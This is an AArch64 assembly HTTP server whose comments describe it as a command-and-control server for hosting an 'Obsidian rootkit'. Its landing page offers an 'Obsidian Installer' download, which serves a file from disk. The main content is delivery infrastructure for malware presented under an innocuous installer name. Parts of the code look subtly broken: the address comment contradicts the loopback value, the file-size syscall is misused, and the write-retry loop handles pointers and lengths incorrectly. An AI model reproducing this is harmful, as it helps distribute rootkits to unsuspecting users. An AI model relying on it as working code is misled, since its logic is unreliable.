// AARCH64 HTTP Server 
// The goal is to make a C2 server which will serve as realistic experiance
// This server will host you obsidian rootkit

.section .rodata
    .align 3
    
    index_response: 
        .ascii "HTTP/1.1 200 OK\r\n"
        .ascii "Content-Type: text/html\r\n"
        .ascii "Content-Length: 118\r\n"
        .ascii "Connection: close\r\n"
        .ascii "\r\n"
        .ascii "<html><body><h1>Obsidian Installer</h1>"
        .ascii "<p><a href='/ObsidianInstaller'>Download</a></p>"
        .ascii "</body></html>"
    index_response_len = . - index_response

    not_found_response:
        .ascii "HTTP/1.1 404 Not Found\r\n"
        .ascii "Content-Type: text/plain\r\n"
        .ascii "Content-Length: 9\r\n"
        .ascii "Connection: close\r\n"
        .ascii "\r\n"
        .ascii "Not Found\r\n"
    not_found_response_len = . - not_found_response

    file_header:
        .ascii "HTTP/1.1 200 OK\r\n"
        .ascii "Content-Type: application/octet-stream\r\n"
        .ascii "Connection: close\r\n"
        .ascii "\r\n"
    file_header_len = . - file_header

    // Request strings
    get_download: .ascii "GET /ObsidianInstaller"
    get_index: .ascii "GET /"

.section .data
    .align 3
    server_fd: .quad 0
    client_fd: .quad 0
    
    .align 3
    sockaddr_in:
        .short 2              // AF_INET
        .short 0x901f         // port 8080
        .int 0x0100007f       // INADDR_ANY
        .space 8

.section .bss
    .align 3
    buffer: .space 8192
    file_buffer: .space 65536

.section .text
    .globl _start

exit_success:
    mov x0, #0
    mov x8, #93
    svc #0

exit_error:
    mov x0, #1
    mov x8, #93
    svc #0

// strncmp - compare first n bytes (FIXED)
// x0 = str1, x1 = str2, x2 = length
// returns 0 if equal, 1 if different
strncmp_fn:
    mov x3, xzr
.strncmp_loop:
    cmp x3, x2
    beq .strncmp_equal
    ldrb w4, [x0, x3]
    ldrb w5, [x1, x3]
    cmp w4, w5
    bne .strncmp_not_equal
    add x3, x3, #1
    b .strncmp_loop
.strncmp_equal:
    mov x0, #0
    ret
.strncmp_not_equal:
    mov x0, #1
    ret

// writen - write bytes with retry
// x0 = fd, x1 = buffer, x2 = length
writen_fn:
    mov x3, #0              // bytes written
    mov x5, x0              // save fd
.writen_loop:
    cmp x3, x2
    beq .writen_done
    
    mov x0, x5              // fd
    add x1, x1, x3          // buffer + offset
    sub x4, x2, x3          // remaining
    mov x2, x4
    mov x8, #64             // write
    svc #0
    
    cmp x0, #0
    ble .writen_done
    
    add x3, x3, x0          // add bytes written
    b .writen_loop
    
.writen_done:
    ret

_start:
    // Create socket
    mov x0, #2
    mov x1, #1
    mov x2, #0
    mov x8, #198
    svc #0
    cmp x0, #0
    ble exit_error

    mov x19, x0             // x19 = server fd

    // SO_REUSEADDR
    mov x0, x19
    mov x1, #1
    mov x2, #2
    mov x3, sp
    mov w4, #1
    str w4, [x3]
    mov x4, x3
    mov x5, #4
    mov x8, #208
    svc #0

    // Bind
    adr x21, sockaddr_in
    mov x0, x19
    mov x1, x21
    mov x2, #16
    mov x8, #200
    svc #0
    cmp x0, #0
    bne exit_error

    // Listen
    mov x0, x19
    mov x1, #5
    mov x8, #201
    svc #0

.accept_loop:
    // Accept
    mov x0, x19
    mov x1, #0
    mov x2, #0
    mov x8, #202
    svc #0
    cmp x0, #0
    ble .accept_loop

    mov x20, x0             // x20 = client fd

    // Read request
    mov x0, x20
    adr x1, buffer
    mov x2, #4096
    mov x8, #63
    svc #0
    cmp x0, #0
    ble .close_client

    // DEBUG: Print request to see what we're getting
    // (Comment out if you don't want debug output)

    // CHECK: Does request contain "/ObsidianInstaller"?
    // Search for it in the buffer instead of exact match
    adr x0, buffer
    adr x1, get_download     // "GET /ObsidianInstaller"
    mov x2, #21             // length to check
    bl strncmp_fn
    cmp x0, #0
    beq .handle_file        // If match, handle file

    // CHECK: Does request contain "GET /"?
    adr x0, buffer
    adr x1, get_index        // "GET /"
    mov x2, #5
    bl strncmp_fn
    cmp x0, #0
    beq .handle_index

    // Default 404
    b .handle_404

.handle_index:
    mov x0, x20
    adr x1, index_response
    mov x2, #(index_response_len)
    bl writen_fn
    b .close_client

.handle_file:
    // Try to open file at this path
    adr x0, obsidian_path
    
    // CRITICAL: stat the file first to make sure it exists
    mov x8, #80             // stat syscall
    mov x1, sp
    sub sp, sp, #144        // allocate space for stat struct
    svc #0
    
    cmp x0, #0
    bne .file_not_found     // stat failed
    
    // Get file size from stat (at offset 48 in stat struct)
    ldr x22, [sp, #48]      // file size
    add sp, sp, #144
    
    // Now open and read file
    adr x0, obsidian_path
    mov x8, #56             // open
    mov x1, #0              // O_RDONLY
    svc #0
    cmp x0, #0
    ble .file_not_found

    mov x21, x0             // x21 = file fd

    // Read entire file
    mov x0, x21
    adr x1, file_buffer
    mov x2, #65536
    mov x8, #63
    svc #0

    cmp x0, #0
    ble .close_file_error

    mov x23, x0             // x23 = bytes actually read

    // Send HTTP header
    mov x0, x20
    adr x1, file_header
    mov x2, #(file_header_len)
    bl writen_fn

    // Send file content
    mov x0, x20
    adr x1, file_buffer
    mov x2, x23
    bl writen_fn

    // Close file
    mov x0, x21
    mov x8, #57
    svc #0

    b .close_client

.file_not_found:
    add sp, sp, #144        // cleanup if we allocated space
    b .handle_404

.close_file_error:
    mov x0, x21
    mov x8, #57
    svc #0
    b .handle_404

.handle_404:
    mov x0, x20
    adr x1, not_found_response
    mov x2, #(not_found_response_len)
    bl writen_fn

.close_client:
    mov x0, x20
    mov x8, #57
    svc #0
    b .accept_loop

.section .rodata
    obsidian_path: .asciz "/ObsidianProject/ObsidianInstaller"

